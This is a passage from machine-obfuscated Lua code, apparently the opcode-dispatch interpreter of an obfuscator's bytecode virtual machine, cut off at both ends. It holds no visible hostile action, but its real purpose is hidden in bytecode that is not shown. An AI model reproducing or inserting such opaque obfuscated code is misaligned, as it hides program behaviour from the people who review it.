bb;w[y[548]]={};n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]]={r({},1,y[613])};n=n+1;y=f[n];w[y[548]]=w[y[613]];n=n+1;y=f[n];bb=y[548];ba=w[bb];for bc=bb+1,y[613]do t(ba,w[bc])end;end;elseif z<=183 then w[y[548]]=(y[613]*w[y[554]]);elseif 184<z then local ba;w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](r(w,ba+1,y[613]))else local ba;w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](r(w,ba+1,y[613]))end;elseif 188>=z then if 186>=z then w[y[548]]={r({},1,y[613])};elseif 188~=z then local ba=y[548];local bb=w[y[613]];w[ba+1]=bb;w[ba]=bb[y[554]];else local ba=y[548];do return r(w,ba,p)end;end;elseif 190>=z then if(z<190)then local ba,bb=0 while true do if ba<=12 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if ba~=2 then w={};else for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;end end else if ba<=3 then n=n+1;else if ba<5 then y=f[n];else w[y[548]]=h[y[613]];end end end else if ba<=8 then if ba<=6 then n=n+1;else if 7==ba then y=f[n];else w[y[548]]=j[y[613]];end end else if ba<=10 then if ba<10 then n=n+1;else y=f[n];end else if 11<ba then n=n+1;else w[y[548]]=w[y[613]][y[554]];end end end end else if ba<=18 then if ba<=15 then if ba<=13 then y=f[n];else if 15>ba then w[y[548]]=y[613];else n=n+1;end end else if ba<=16 then y=f[n];else if ba<18 then w[y[548]]=y[613];else n=n+1;end end end else if ba<=21 then if ba<=19 then y=f[n];else if 20<ba then n=n+1;else w[y[548]]=y[613];end end else if ba<=23 then if 22==ba then y=f[n];else bb=y[548]end else if ba==24 then w[bb]=w[bb](r(w,bb+1,y[613]))else break end end end end end ba=ba+1 end else w[y[548]]=(w[y[613]]%w[y[554]]);end;elseif 191<z then local ba=y[548];w[ba]=w[ba]-w[ba+2];n=y[613];else local ba;local bb;w[y[548]]={};n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]]={r({},1,y[613])};n=n+1;y=f[n];w[y[548]]=w[y[613]];n=n+1;y=f[n];bb=y[548];ba=w[bb];for bc=bb+1,y[613]do t(ba,w[bc])end;end;elseif z<=288 then if 240>=z then if(z==216 or z<216)then if(z<204 or z==204)then if(198==z or 198>z)then if(195==z or 195>z)then if(193>z or 193==z)then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba==0 then bb=nil else w[y[548]]=w[y[613]][y[554]];end else if 3>ba then n=n+1;else y=f[n];end end else if ba<=5 then if ba<5 then w[y[548]]=y[613];else n=n+1;end else if 6<ba then w[y[548]]=y[613];else y=f[n];end end end else if ba<=11 then if ba<=9 then if 8==ba then n=n+1;else y=f[n];end else if 11~=ba then w[y[548]]=y[613];else n=n+1;end end else if ba<=13 then if 13>ba then y=f[n];else bb=y[548]end else if ba~=15 then w[bb]=w[bb](r(w,bb+1,y[613]))else break end end end end ba=ba+1 end elseif not(z==195)then local ba=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba~=1 then w[y[548]]=w[y[613]][y[554]];else n=n+1;end else if 3>ba then y=f[n];else w[y[548]][y[613]]=w[y[554]];end end else if ba<=5 then if 4<ba then y=f[n];else n=n+1;end else if ba>6 then n=n+1;else w[y[548]]=w[y[613]][y[554]];end end end else if ba<=11 then if ba<=9 then if 8==ba then y=f[n];else w[y[548]]=h[y[613]];end else if ba>10 then y=f[n];else n=n+1;end end else if ba<=13 then if 12==ba then w[y[548]]=w[y[613]][y[554]];else n=n+1;end else if ba<=14 then y=f[n];else if 16~=ba then if(w[y[548]]~=w[y[554]])then n=n+1;else n=y[613];end;else break end end end end end ba=ba+1 end else local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 1~=ba then bb=nil else bc=nil end else if ba<=2 then bd=nil else if ba>3 then n=n+1;else w[y[548]]=h[y[613]];end end end else if ba<=6 then if ba>5 then w[y[548]]=h[y[613]];else y=f[n];end else if ba<=7 then n=n+1;else if ba>8 then w[y[548]]=w[y[613]][y[554]];else y=f[n];end end end end else if ba<=14 then if ba<=11 then if ba~=11 then n=n+1;else y=f[n];end else if ba<=12 then w[y[548]]=w[y[613]][w[y[554]]];else if ba>13 then y=f[n];else n=n+1;end end end else if ba<=16 then if ba>15 then bc={w[bd](w[bd+1])};else bd=y[548]end else if ba<=17 then bb=0;else if ba==18 then for be=bd,y[554]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end end;elseif(z<=196)then local ba,bb=0 while true do if ba<=13 then if ba<=6 then if ba<=2 then if ba<=0 then bb=nil else if ba==1 then w[y[548]]={};else n=n+1;end end else if ba<=4 then if ba==3 then y=f[n];else w[y[548]]=h[y[613]];end else if ba==5 then n=n+1;else y=f[n];end end end else if ba<=9 then if ba<=7 then w[y[548]]=w[y[613]][y[554]];else if 9~=ba then n=n+1;else y=f[n];end end else if ba<=11 then if ba<11 then w[y[548]][y[613]]=w[y[554]];else n=n+1;end else if 13~=ba then y=f[n];else w[y[548]]=j[y[613]];end end end end else if ba<=20 then if ba<=16 then if ba<=14 then n=n+1;else if ba~=16 then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end else if ba<=18 then if ba>17 then y=f[n];else n=n+1;end else if ba>19 then n=n+1;else w[y[548]]=j[y[613]];end end end else if ba<=23 then if ba<=21 then y=f[n];else if 22==ba then w[y[548]]=w[y[613]][y[554]];else n=n+1;end end else if ba<=25 then if ba<25 then y=f[n];else bb=y[548]end else if ba>26 then break else w[bb]=w[bb]()end end end end end ba=ba+1 end elseif(197==z)then local ba,bb=0 while true do if ba<=10 then if ba<=4 then if ba<=1 then if 1>ba then bb=nil else w={};end else if ba<=2 then for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;else if 3<ba then y=f[n];else n=n+1;end end end else if ba<=7 then if ba<=5 then w[y[548]]=h[y[613]];else if ba~=7 then n=n+1;else y=f[n];end end else if ba<=8 then w[y[548]]=w[y[613]][y[554]];else if 10>ba then n=n+1;else y=f[n];end end end end else if ba<=16 then if ba<=13 then if ba<=11 then w[y[548]]=h[y[613]];else if 12<ba then y=f[n];else n=n+1;end end else if ba<=14 then w[y[548]]=h[y[613]];else if ba<16 then n=n+1;else y=f[n];end end end else if ba<=19 then if ba<=17 then w[y[548]]=w[y[613]][w[y[554]]];else if 18<ba then y=f[n];else n=n+1;end end else if ba<=20 then bb=y[548]else if ba<22 then w[bb](w[bb+1])else break end end end end end ba=ba+1 end else local ba=y[548];local bb=w[y[613]];w[ba+1]=bb;w[ba]=bb[w[y[554]]];end;elseif 201>=z then if(z<199 or z==199)then local ba=d[y[613]];local bb={};local bc={};for bd=1,y[554]do n=(n+1);local be=f[n];if(be[343]==6)then bc[bd-1]={w,be[613],nil,nil,nil,nil,nil};else bc[(bd-1)]={h,be[613],nil,nil,nil,nil};end;v[(#v+1)]=bc;end;m(bb,{['\95\95\105\110\100\101\120']=function(m,m)local m=bc[m];return m[1][m[2]];end,['\95\95\110\101\119\105\110\100\101\120']=function(m,m,v)local m=bc[m]m[1][m[2]]=v;end;});w[y[548]]=b(ba,bb,j);elseif not(z==201)then n=y[613];else local m,v=0 while true do if m<=10 then if m<=4 then if m<=1 then if 0<m then w={};else v=nil end else if m<=2 then for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;else if m==3 then n=n+1;else y=f[n];end end end else if m<=7 then if m<=5 then w[y[548]]=h[y[613]];else if 7>m then n=n+1;else y=f[n];end end else if m<=8 then w[y[548]]=w[y[613]][y[554]];else if 9==m then n=n+1;else y=f[n];end end end end else if m<=16 then if m<=13 then if m<=11 then w[y[548]]=h[y[613]];else if 12<m then y=f[n];else n=n+1;end end else if m<=14 then w[y[548]]=h[y[613]];else if m>15 then y=f[n];else n=n+1;end end end else if m<=19 then if m<=17 then w[y[548]]=w[y[613]][w[y[554]]];else if m==18 then n=n+1;else y=f[n];end end else if m<=20 then v=y[548]else if m>21 then break else w[v](w[v+1])end end end end end m=m+1 end end;elseif 202>=z then local m,v,ba=0 while true do if m<=24 then if(m==11 or m<11)then if(m<=5)then if m<=2 then if(m<=0)then v=nil else if not(m~=1)then ba=nil else w[y[548]]={};end end else if(m<=3)then n=n+1;else if(5~=m)then y=f[n];else w[y[548]]=h[y[613]];end end end else if(m<=8)then if(m==6 or m<6)then n=(n+1);else if not(8==m)then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end else if(m<=9)then n=(n+1);else if m==10 then y=f[n];else w[y[548]]=h[y[613]];end end end end else if(m==17 or m<17)then if(m<=14)then if(m<=12)then n=(n+1);else if(13<m)then w[y[548]]=w[y[613]][y[554]];else y=f[n];end end else if m<=15 then n=(n+1);else if(16<m)then w[y[548]]=w[y[613]][y[554]];else y=f[n];end end end else if(m==20 or m<20)then if(m<=18)then n=(n+1);else if not(20==m)then y=f[n];else w[y[548]]={};end end else if m<=22 then if(21<m)then y=f[n];else n=n+1;end else if(23==m)then w[y[548]]={};else n=n+1;end end end end end else if m<=37 then if(m==30 or m<30)then if(m<=27)then if(m<25 or m==25)then y=f[n];else if(m<27)then w[y[548]]=h[y[613]];else n=(n+1);end end else if(m<28 or m==28)then y=f[n];else if(29<m)then n=n+1;else w[y[548]][y[613]]=w[y[554]];end end end else if(m==33 or m<33)then if m<=31 then y=f[n];else if 33~=m then w[y[548]]=h[y[613]];else n=n+1;end end else if m<=35 then if m~=35 then y=f[n];else w[y[548]][y[613]]=w[y[554]];end else if(m==36)then n=n+1;else y=f[n];end end end end else if m<=43 then if(m<=40)then if(m==38 or m<38)then w[y[548]][y[613]]=w[y[554]];else if not(m~=39)then n=(n+1);else y=f[n];end end else if(m==41 or m<41)then w[y[548]]={r({},1,y[613])};else if not(42~=m)then n=(n+1);else y=f[n];end end end else if m<=46 then if m<=44 then w[y[548]]=w[y[613]];else if not(m==46)then n=(n+1);else y=f[n];end end else if(m<=48)then if m<48 then ba=y[548];else v=w[ba];end else if m~=50 then for bb=ba+1,y[613]do t(v,w[bb])end;else break end end end end end end m=(m+1)end elseif 204>z then w[y[548]]=(w[y[613]]/y[554]);else local m,v,ba,bb=0 while true do if m<=9 then if m<=4 then if m<=1 then if m<1 then v=nil else ba=nil end else if m<=2 then bb=nil else if 3<m then n=n+1;else w[y[548]]=h[y[613]];end end end else if m<=6 then if m==5 then y=f[n];else w[y[548]]=h[y[613]];end else if m<=7 then n=n+1;else if 8==m then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end end end else if m<=14 then if m<=11 then if 10<m then y=f[n];else n=n+1;end else if m<=12 then w[y[548]]=w[y[613]][w[y[554]]];else if m~=14 then n=n+1;else y=f[n];end end end else if m<=16 then if m<16 then bb=y[548]else ba={w[bb](w[bb+1])};end else if m<=17 then v=0;else if m<19 then for bc=bb,y[554]do v=v+1;w[bc]=ba[v];end else break end end end end end m=m+1 end end;elseif(210==z or 210>z)then if 207>=z then if z<=205 then local m,v=0 while true do if m<=9 then if m<=4 then if m<=1 then if m>0 then w[y[548]]=w[y[613]][y[554]];else v=nil end else if m<=2 then n=n+1;else if m>3 then w[y[548]]=y[613];else y=f[n];end end end else if m<=6 then if m~=6 then n=n+1;else y=f[n];end else if m<=7 then w[y[548]]=h[y[613]];else if m<9 then n=n+1;else y=f[n];end end end end else if m<=14 then if m<=11 then if m>10 then n=n+1;else w[y[548]]=w[y[613]][y[554]];end else if m<=12 then y=f[n];else if m~=14 then v=y[548];else do return w[v](r(w,v+1,y[613]))end;end end end else if m<=16 then if m==15 then n=n+1;else y=f[n];end else if m<=17 then v=y[548];else if m==18 then do return r(w,v,p)end;else break end end end end end m=m+1 end elseif not(207==z)then if(w[y[548]]<w[y[554]])then n=(n+1);else n=y[613];end;else w[y[548]]=h[y[613]];end;elseif(208>z or 208==z)then n=y[613];elseif not(z==210)then w[y[548]]=y[613];else local m=0 while true do if m<=9 then if m<=4 then if m<=1 then if m<1 then w[y[548]]={};else n=n+1;end else if m<=2 then y=f[n];else if m==3 then w[y[548]]={};else n=n+1;end end end else if m<=6 then if 6>m then y=f[n];else w[y[548]]={};end else if m<=7 then n=n+1;else if m>8 then w[y[548]]={};else y=f[n];end end end end else if m<=14 then if m<=11 then if m<11 then n=n+1;else y=f[n];end else if m<=12 then w[y[548]]={};else if 14>m then n=n+1;else y=f[n];end end end else if m<=16 then if 15<m then n=n+1;else w[y[548]]=y[613];end else if m<=17 then y=f[n];else if 18<m then break else w[y[548]]=w[y[613]][w[y[554]]];end end end end end m=m+1 end end;elseif(213==z or 213>z)then if z<=211 then w[y[548]]={};elseif z>212 then w[y[548]]=w[y[613]]%y[554];else local m,v=0 while true do if m<=7 then if m<=3 then if m<=1 then if 1~=m then v=nil else w[y[548]]=j[y[613]];end else if m<3 then n=n+1;else y=f[n];end end else if m<=5 then if 5>m then w[y[548]]=w[y[613]][y[554]];else n=n+1;end else if m==6 then y=f[n];else w[y[548]]=h[y[613]];end end end else if m<=11 then if m<=9 then if 9>m then n=n+1;else y=f[n];end else if 10==m then w[y[548]]=w[y[613]][y[554]];else n=n+1;end end else if m<=13 then if m==12 then y=f[n];else v=y[548]end else if m>14 then break else w[v]=w[v](w[v+1])end end end end m=m+1 end end;elseif(z<=214)then local m,v=0 while true do if m<=7 then if(m<=3)then if(m==1 or m<1)then if(0==m)then v=nil else w[y[548]]=w[y[613]][y[554]];end else if 2<m then y=f[n];else n=n+1;end end else if(m==5 or m<5)then if m>4 then n=n+1;else w[y[548]]=w[y[613]][y[554]];end else if(m>6)then w[y[548]]=h[y[613]];else y=f[n];end end end else if m<=11 then if(m<=9)then if(m<9)then n=(n+1);else y=f[n];end else if m>10 then n=n+1;else w[y[548]]=w[y[613]][y[554]];end end else if m<=13 then if m>12 then v=y[548]else y=f[n];end else if m>14 then break else w[v]=w[v](r(w,v+1,y[613]))end end end end m=(m+1)end elseif z<216 then if(w[y[548]]==w[y[554]]or w[y[548]]<w[y[554]])then n=(n+1);else n=y[613];end;else local m,v=0 while true do if m<=8 then if m<=3 then if m<=1 then if m>0 then w[y[548]]=w[y[613]][y[554]];else v=nil end else if m==2 then n=n+1;else y=f[n];end end else if m<=5 then if 5~=m then w[y[548]]=w[y[613]][y[554]];else n=n+1;end else if m<=6 then y=f[n];else if 8~=m then w[y[548]]=w[y[613]][y[554]];else n=n+1;end end end end else if m<=13 then if m<=10 then if 9==m then y=f[n];else w[y[548]]=w[y[613]][y[554]];end else if m<=11 then n=n+1;else if m>12 then w[y[548]]=w[y[613]][y[554]];else y=f[n];end end end else if m<=15 then if 15~=m then n=n+1;else y=f[n];end else if m<=16 then v=y[548]else if m==17 then w[v]=w[v](w[v+1])else break end end end end end m=m+1 end end;elseif(z==228 or z<228)then if 222>=z then if 219>=z then if(217>=z)then if(y[548]<w[y[554]]or y[548]==w[y[554]])then n=(n+1);else n=y[613];end;elseif not(218~=z)then local m=(w[y[548]]+y[554]);w[y[548]]=m;if(m==w[y[548]+1]or m<w[y[548]+1])then n=y[613];end;else w[y[548]]={r({},1,y[613])};end;elseif(z<=220)then if not w[y[548]]then n=(n+1);else n=y[613];end;elseif not(221~=z)then if(w[y[548]]~=w[y[554]])then n=y[613];else n=(n+1);end;else w[y[548]]=false;n=n+1;end;elseif 225>=z then if z<=223 then local m,v,ba,bb=0 while true do if m<=9 then if m<=4 then if m<=1 then if m<1 then v=nil else ba=nil end else if m<=2 then bb=nil else if m==3 then w[y[548]]=h[y[613]];else n=n+1;end end end else if m<=6 then if m~=6 then y=f[n];else w[y[548]]=h[y[613]];end else if m<=7 then n=n+1;else if m<9 then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end end end else if m<=14 then if m<=11 then if m==10 then n=n+1;else y=f[n];end else if m<=12 then w[y[548]]=w[y[613]][w[y[554]]];else if m<14 then n=n+1;else y=f[n];end end end else if m<=16 then if 16~=m then bb=y[548]else ba={w[bb](w[bb+1])};end else if m<=17 then v=0;else if m==18 then for bc=bb,y[554]do v=v+1;w[bc]=ba[v];end else break end end end end end m=m+1 end elseif not(z==225)then local m=y[548];do return w[m],w[m+1]end else local m=0 while true do if m<=7 then if m<=3 then if m<=1 then if m<1 then w[y[548]]=w[y[613]][y[554]];else n=n+1;end else if m~=3 then y=f[n];else w[y[548]][y[613]]=w[y[554]];end end else if m<=5 then if m==4 then n=n+1;else y=f[n];end else if m<7 then w[y[548]]=w[y[613]][y[554]];else n=n+1;end end end else if m<=11 then if m<=9 then if 9~=m then y=f[n];else w[y[548]]=h[y[613]];end else if 11>m then n=n+1;else y=f[n];end end else if m<=13 then if m~=13 then w[y[548]]=w[y[613]][y[554]];else n=n+1;end else if m<=14 then y=f[n];else if m<16 then if(w[y[548]]~=w[y[554]])then n=n+1;else n=y[613];end;else break end end end end end m=m+1 end end;elseif(226>z or 226==z)then local m,v=0 while true do if m<=29 then if m<=14 then if m<=6 then if m<=2 then if m<=0 then v=nil else if 1<m then n=n+1;else w[y[548]]={};end end else if m<=4 then if 4~=m then y=f[n];else w[y[548]]=y[613];end else if m>5 then y=f[n];else n=n+1;end end end else if m<=10 then if m<=8 then if 8~=m then w[y[548]][w[y[613]]]=w[y[554]];else n=n+1;end else if m>9 then w[y[548]]=y[613];else y=f[n];end end else if m<=12 then if 12~=m then n=n+1;else y=f[n];end else if 13==m then w[y[548]][w[y[613]]]=w[y[554]];else n=n+1;end end end end else if m<=21 then if m<=17 then if m<=15 then y=f[n];else if m==16 then w[y[548]]=y[613];else n=n+1;end end else if m<=19 then if m>18 then w[y[548]][w[y[613]]]=w[y[554]];else y=f[n];end else if 21>m then n=n+1;else y=f[n];end end end else if m<=25 then if m<=23 then if 22==m then w[y[548]]=y[613];else n=n+1;end else if m>24 then w[y[548]][w[y[613]]]=w[y[554]];else y=f[n];end end else if m<=27 then if m>26 then y=f[n];else n=n+1;end else if 28==m then w[y[548]]=y[613];else n=n+1;end end end end end else if m<=44 then if m<=36 then if m<=32 then if m<=30 then y=f[n];else if m<32 then w[y[548]][w[y[613]]]=w[y[554]];else n=n+1;end end else if m<=34 then if m>33 then w[y[548]]=y[613];else y=f[n];end else if 36~=m then n=n+1;else y=f[n];end end end else if m<=40 then if m<=38 then if 38>m then w[y[548]][w[y[613]]]=w[y[554]];else n=n+1;end else if 40~=m then y=f[n];else w[y[548]]={};end end else if m<=42 then if 41<m then y=f[n];else n=n+1;end else if 44>m then w[y[548]]=y[613];else n=n+1;end end end end else if m<=52 then if m<=48 then if m<=46 then if 46>m then y=f[n];else w[y[548]][w[y[613]]]=w[y[554]];end else if m<48 then n=n+1;else y=f[n];end end else if m<=50 then if m~=50 then w[y[548]]=j[y[613]];else n=n+1;end else if 52~=m then y=f[n];else w[y[548]]=w[y[613]];end end end else if m<=56 then if m<=54 then if 53==m then n=n+1;else y=f[n];end else if 56>m then w[y[548]]=w[y[613]];else n=n+1;end end else if m<=58 then if 58~=m then y=f[n];else v=y[548]end else if 60>m then w[v](r(w,v+1,y[613]))else break end end end end end end m=m+1 end elseif 227<z then local m,v=0 while true do if m<=16 then if m<=7 then if m<=3 then if m<=1 then if 1>m then v=nil else w[y[548]]=w[y[613]][y[554]];end else if 3~=m then n=n+1;else y=f[n];end end else if m<=5 then if m~=5 then w[y[548]]=h[y[613]];else n=n+1;end else if 6==m then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end end else if m<=11 then if m<=9 then if 8==m then n=n+1;else y=f[n];end else if m<11 then w[y[548]]={};else n=n+1;end end else if m<=13 then if 13~=m then y=f[n];else w[y[548]]=h[y[613]];end else if m<=14 then n=n+1;else if m==15 then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end end end end else if m<=24 then if m<=20 then if m<=18 then if m<18 then n=n+1;else y=f[n];end else if 20>m then w[y[548]]=h[y[613]];else n=n+1;end end else if m<=22 then if 22>m then y=f[n];else w[y[548]]={};end else if m==23 then n=n+1;else y=f[n];end end end else if m<=28 then if m<=26 then if m==25 then w[y[548]]=h[y[613]];else n=n+1;end else if 27==m then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end else if m<=30 then if m>29 then y=f[n];else n=n+1;end else if m<=31 then v=y[548]else if 32<m then break else w[v]=w[v]()end end end end end end m=m+1 end else local m=0 while true do if m<=9 then if m<=4 then if m<=1 then if 0==m then w[y[548]][y[613]]=y[554];else n=n+1;end else if m<=2 then y=f[n];else if 4>m then w[y[548]]={};else n=n+1;end end end else if m<=6 then if m>5 then w[y[548]][y[613]]=w[y[554]];else y=f[n];end else if m<=7 then n=n+1;else if 9~=m then y=f[n];else w[y[548]]=h[y[613]];end end end end else if m<=14 then if m<=11 then if 10<m then y=f[n];else n=n+1;end else if m<=12 then w[y[548]]=w[y[613]][y[554]];else if m~=14 then n=n+1;else y=f[n];end end end else if m<=16 then if m==15 then w[y[548]][y[613]]=w[y[554]];else n=n+1;end else if m<=17 then y=f[n];else if 18<m then break else w[y[548]][y[613]]=w[y[554]];end end end end end m=m+1 end end;elseif(z<=234)then if(z<231 or z==231)then if(z==229 or z<229)then local m,v=0 while true do if m<=8 then if(m<=3)then if(m<=1)then if not(m~=0)then v=nil else w[y[548]]=w[y[613]][w[y[554]]];end else if m>2 then y=f[n];else n=(n+1);end end else if m<=5 then if m<5 then w[y[548]]=w[y[613]];else n=n+1;end else if m<=6 then y=f[n];else if 7<m then n=(n+1);else w[y[548]]=y[613];end end end end else if(m<=13)then if(m==10 or m<10)then if not(m~=9)then y=f[n];else w[y[548]]=y[613];end else if m<=11 then n=(n+1);else if m~=13 then y=f[n];else w[y[548]]=y[613];end end end else if(m<15 or m==15)then if 14<m then y=f[n];else n=(n+1);end else if m<=16 then v=y[548]else if(18~=m)then w[v]=w[v](r(w,v+1,y[613]))else break end end end end end m=(m+1)end elseif not(231==z)then if(y[548]<w[y[554]]or y[548]==w[y[554]])then n=n+1;else n=y[613];end;else local m,v=0 while true do if m<=14 then if m<=6 then if m<=2 then if m<=0 then v=nil else if 2~=m then w[y[548]]=w[y[613]][y[554]];else n=n+1;end end else if m<=4 then if m<4 then y=f[n];else w[y[548]]=w[y[613]][y[554]];end else if 5<m then y=f[n];else n=n+1;end end end else if m<=10 then if m<=8 then if 8~=m then w[y[548]]=w[y[613]][y[554]];else n=n+1;end else if m>9 then w[y[548]]=w[y[613]]*y[554];else y=f[n];end end else if m<=12 then if m<12 then n=n+1;else y=f[n];end else if m>13 then n=n+1;else w[y[548]]=w[y[613]]+w[y[554]];end end end end else if m<=22 then if m<=18 then if m<=16 then if 15==m then y=f[n];else w[y[548]]=j[y[613]];end else if m~=18 then n=n+1;else y=f[n];end end else if m<=20 then if m==19 then w[y[548]]=w[y[613]][y[554]];else n=n+1;end else if 21==m then y=f[n];else w[y[548]]=w[y[613]];end end end else if m<=26 then if m<=24 then if m>23 then y=f[n];else n=n+1;end else if m<26 then w[y[548]]=w[y[613]]+w[y[554]];else n=n+1;end end else if m<=28 then if m~=28 then y=f[n];else v=y[548]end else if m==29 then w[v]=w[v](r(w,v+1,y[613]))else break end end end end end m=m+1 end end;elseif(z==232 or z<232)then w[y[548]]=h[y[613]];elseif not(233~=z)then w[y[548]]=j[y[613]];else w[y[548]]=b(d[y[613]],nil,j);end;elseif(z<237 or z==237)then if z<=235 then local d,m=0 while true do if d<=36 then if d<=17 then if d<=8 then if d<=3 then if d<=1 then if d>0 then w[y[548]]=w[y[613]][y[554]];else m=nil end else if 3~=d then n=n+1;else y=f[n];end end else if d<=5 then if d<5 then w[y[548]]=j[y[613]];else n=n+1;end else if d<=6 then y=f[n];else if d<8 then w[y[548]]=w[y[613]][y[554]];else n=n+1;end end end end else if d<=12 then if d<=10 then if 10~=d then y=f[n];else w[y[548]]=h[y[613]];end else if 12~=d then n=n+1;else y=f[n];end end else if d<=14 then if d==13 then w[y[548]]=w[y[613]][y[554]];else n=n+1;end else if d<=15 then y=f[n];else if d==16 then w[y[548]]=w[y[613]][w[y[554]]];else n=n+1;end end end end end else if d<=26 then if d<=21 then if d<=19 then if d~=19 then y=f[n];else w[y[548]]=w[y[613]][y[554]];end else if 21~=d then n=n+1;else y=f[n];end end else if d<=23 then if d>22 then n=n+1;else w[y[548]]=w[y[613]][y[554]];end else if d<=24 then y=f[n];else if d<26 then w[y[548]]=j[y[613]];else n=n+1;end end end end else if d<=31 then if d<=28 then if d==27 then y=f[n];else w[y[548]]=w[y[613]][y[554]];end else if d<=29 then n=n+1;else if d==30 then y=f[n];else w[y[548]]=h[y[613]];end end end else if d<=33 then if 32<d then y=f[n];else n=n+1;end else if d<=34 then w[y[548]]=w[y[613]][y[554]];else if d>35 then y=f[n];else n=n+1;end end end end end end else if d<=54 then if d<=45 then if d<=40 then if d<=38 then if 38~=d then w[y[548]]=w[y[613]][w[y[554]]];else n=n+1;end else if d<40 then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end else if d<=42 then if 41==d then n=n+1;else y=f[n];end else if d<=43 then w[y[548]]=w[y[613]][y[554]];else if d>44 then y=f[n];else n=n+1;end end end end else if d<=49 then if d<=47 then if 47~=d then w[y[548]]=j[y[613]];else n=n+1;end else if 49>d then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end else if d<=51 then if d~=51 then n=n+1;else y=f[n];end else if d<=52 then w[y[548]]=h[y[613]];else if 54~=d then n=n+1;else y=f[n];end end end end end else if d<=63 then if d<=58 then if d<=56 then if 55==d then w[y[548]]=w[y[613]][y[554]];else n=n+1;end else if 58>d then y=f[n];else w[y[548]]=w[y[613]][w[y[554]]];end end else if d<=60 then if 59<d then y=f[n];else n=n+1;end else if d<=61 then w[y[548]]=w[y[613]][y[554]];else if 62<d then y=f[n];else n=n+1;end end end end else if d<=68 then if d<=65 then if d>64 then n=n+1;else w[y[548]]=w[y[613]][y[554]];end else if d<=66 then y=f[n];else if 67==d then m=y[548];else do return w[m](r(w,m+1,y[613]))end;end end end else if d<=70 then if d>69 then y=f[n];else n=n+1;end else if d<=71 then m=y[548];else if d==72 then do return r(w,m,p)end;else break end end end end end end end d=d+1 end elseif not(z==237)then local d,m,v=0 while true do if d<=9 then if d<=4 then if d<=1 then if 0<d then v=nil else m=nil end else if d<=2 then w={};else if 4>d then for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;else n=n+1;end end end else if d<=6 then if d>5 then w[y[548]]=j[y[613]];else y=f[n];end else if d<=7 then n=n+1;else if 8==d then y=f[n];else w[y[548]]=j[y[613]];end end end end else if d<=14 then if d<=11 then if 10==d then n=n+1;else y=f[n];end else if d<=12 then w[y[548]]=w[y[613]][y[554]];else if 14~=d then n=n+1;else y=f[n];end end end else if d<=16 then if 15==d then v=y[548];else m=w[y[613]];end else if d<=17 then w[v+1]=m;else if d<19 then w[v]=m[y[554]];else break end end end end end d=d+1 end else local d=0 while true do if d<=9 then if d<=4 then if d<=1 then if d<1 then w={};else for m=0,u,1 do if m<o then w[m]=s[m+1];else break;end;end;end else if d<=2 then n=n+1;else if 3<d then w[y[548]]=y[613];else y=f[n];end end end else if d<=6 then if 6>d then n=n+1;else y=f[n];end else if d<=7 then w[y[548]]=h[y[613]];else if 8==d then n=n+1;else y=f[n];end end end end else if d<=14 then if d<=11 then if d==10 then w[y[548]]=h[y[613]];else n=n+1;end else if d<=12 then y=f[n];else if d==13 then w[y[548]]=w[y[613]][y[554]];else n=n+1;end end end else if d<=17 then if d<=15 then y=f[n];else if 16<d then n=n+1;else w[y[548]]=w[y[613]][w[y[554]]];end end else if d<=18 then y=f[n];else if 19==d then if(w[y[548]]~=y[554])then n=n+1;else n=y[613];end;else break end end end end end d=d+1 end end;elseif(238>=z)then local d=y[548];local m=w[y[613]];w[d+1]=m;w[d]=m[w[y[554]]];elseif z<240 then h[y[613]]=w[y[548]];else local d=y[613];local m=y[554];local d=k(w,g,d,m);w[y[548]]=d;end;elseif 264>=z then if 252>=z then if z<=246 then if 243>=z then if z<=241 then w[y[548]]=y[613];elseif 242<z then local 